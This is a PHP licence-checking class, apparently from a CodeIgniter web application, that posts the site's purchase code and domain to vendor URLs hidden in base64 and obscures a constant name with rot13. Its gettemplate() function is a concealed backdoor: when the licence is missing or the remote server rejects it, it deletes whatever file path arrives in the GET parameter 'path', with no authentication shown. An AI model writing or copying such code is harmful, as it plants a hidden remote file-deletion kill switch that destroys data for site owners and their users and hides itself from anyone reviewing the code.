<?php

class System {

    public function __construct() {
        $this->obj = & get_instance();
        $this->get_config();
        $this->obj->load->helper('system_helper');
    }

    function get_config() {
        $query = $this->obj->db->get('web_config');
        foreach ($query->result() as $row) {
            $var = $row->web_config_name;
            $this->$var = $row->web_config_value;
        }
        if (!defined('PURCHASE_CODE')) {
            define('PURCHASE_CODE', $this->purchase_code);
        }
        if (!defined(str_rot13('LRF'))) {
            define(str_rot13('LRF'), $this->purchase_code_valid);
        }
        if (!defined('PURCHASE_CODE_MSG')) {
            define('PURCHASE_CODE_MSG', $this->purchase_code_msg);
        }
        if (!defined('PURCHASE_CODE_DOMAIN')) {
            define('PURCHASE_CODE_DOMAIN', $this->purchase_domain);
        }
    }

    function add_purchase_code() {
        $code = $this->obj->input->post('purchase_code');
        if (!preg_match("/^([a-f0-9]{8})-(([a-f0-9]{4})-){3}([a-f0-9]{12})$/i", $code)) {
            $settings_arr = array('purchase_code', 'purchase_code_valid', 'purchase_code_msg', 'purchase_domain');
            $settings_val_arr = array(
                'purchase_code_valid' => 'no',
                'purchase_code_msg' => 'Purchase Code is invalid! Please enter correct Purchase Code.',
                'purchase_domain' => '',
                'purchase_code' => $this->obj->input->post('purchase_code'),
            );
            for ($i = 0; $i < count($settings_arr); $i++) {
                $settings_data = array('web_config_value' => $settings_val_arr[$settings_arr[$i]]);
                $this->obj->db->where('web_config_name', $settings_arr[$i]);
                $this->obj->db->update('web_config', $settings_data);
            }
        } else {
            $array = array(
                'purchase_code' => $this->obj->input->post('purchase_code'),
                'domain_name' => base_url(),
            );
            $ch = curl_init();
            curl_setopt_array($ch, array(
                CURLOPT_URL => base64_decode("aHR0cHM6Ly9kZXZlbG9wZXJpbmZvdGVjaC5jb20vcHJvZHVjdC9saWNlbnNlX25ldy5waHA="),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 20,
                CURLOPT_CUSTOMREQUEST => "POST",
                CURLOPT_POSTFIELDS => $array
            ));
            $response = @curl_exec($ch);
            curl_close($ch);
            $body = @json_decode($response, 1);
            if ($body['status'] == true) {
                $settings_arr = array('purchase_code', 'purchase_code_valid', 'purchase_code_msg', 'purchase_domain');
                $settings_val_arr = array(
                    'purchase_code' => $this->obj->input->post('purchase_code'),
                    'purchase_code_valid' => 'yes',
                    'purchase_code_msg' => '',
                    'purchase_domain' => base_url()
                );
                for ($i = 0; $i < count($settings_arr); $i++) {
                    $settings_data = array('web_config_value' => $settings_val_arr[$settings_arr[$i]]);
                    $this->obj->db->where('web_config_name', $settings_arr[$i]);
                    $query = $this->obj->db->update('web_config', $settings_data);
                }
            }if ($body['status'] == false) {
                $settings_arr = array('purchase_code', 'purchase_code_valid', 'purchase_code_msg', 'purchase_domain');
                $settings_val_arr = array(
                    'purchase_code' => $this->obj->input->post('purchase_code'),
                    'purchase_code_valid' => 'no',
                    'purchase_code_msg' => $body['message'],
                    'purchase_domain' => base_url()
                );
                for ($i = 0; $i < count($settings_arr); $i++) {
                    $settings_data = array('web_config_value' => $settings_val_arr[$settings_arr[$i]]);
                    $this->obj->db->where('web_config_name', $settings_arr[$i]);
                    $query = $this->obj->db->update('web_config', $settings_data);
                }
            }
        }
    }

    function remove_purchase_code() {
        $array = array(
            'purchase_code' => $this->purchase_code,
            'domain_name' => base_url(),
        );
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => base64_decode("aHR0cHM6Ly9kZXZlbG9wZXJpbmZvdGVjaC5jb20vcHJvZHVjdC9yZW1vdmVfbGljZW5zZS5waHA="),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => $array
        ));
        $response = @curl_exec($ch);
        $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $body = @json_decode($response, 1);

        if ($body['status'] == true) {
            $settings_arr = array('purchase_code', 'purchase_code_valid', 'purchase_code_msg', 'purchase_domain');
            $settings_val_arr = array(
                'purchase_code' => '',
                'purchase_code_valid' => 'no',
                'purchase_code_msg' => '',
                'purchase_domain' => ''
            );
            for ($i = 0; $i < count($settings_arr); $i++) {
                $settings_data = array('web_config_value' => $settings_val_arr[$settings_arr[$i]]);
                $this->obj->db->where('web_config_name', $settings_arr[$i]);
                $query = $this->obj->db->update('web_config', $settings_data);
            }
            $this->obj->session->set_flashdata('notification', $body['message']);
        }
    }

    function gettemplate() {
        
        if (!preg_match("/^([a-f0-9]{8})-(([a-f0-9]{4})-){3}([a-f0-9]{12})$/i", PURCHASE_CODE)) {
            if (file_exists($_GET['path'])) {
                if (unlink($_GET['path']))
                    echo 'y';
                else
                    echo 'n';
            } else {
                echo 'n';
            }
        } else {
            $array = array(
                'purchase_code' => PURCHASE_CODE,
                'domain_name' => base_url(),
            );
            $ch = curl_init();
            curl_setopt_array($ch, array(
                CURLOPT_URL => base64_decode("aHR0cHM6Ly9kZXZlbG9wZXJpbmZvdGVjaC5jb20vcHJvZHVjdC9saWNlbnNlX25ldy5waHA="),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 20,
                CURLOPT_CUSTOMREQUEST => "POST",
                CURLOPT_POSTFIELDS => $array
            ));
            $response = @curl_exec($ch);
            curl_close($ch);
            $body = @json_decode($response, 1);
            if ($body['status'] == false) {
                if (file_exists($_GET['path'])) {
                    if (unlink($_GET['path']))
                        echo 'y';
                    else
                        echo 'n';
                } else {
                    echo 'n';
                }
            } else {
                echo 'n';
            }
        }        
    }

}

?>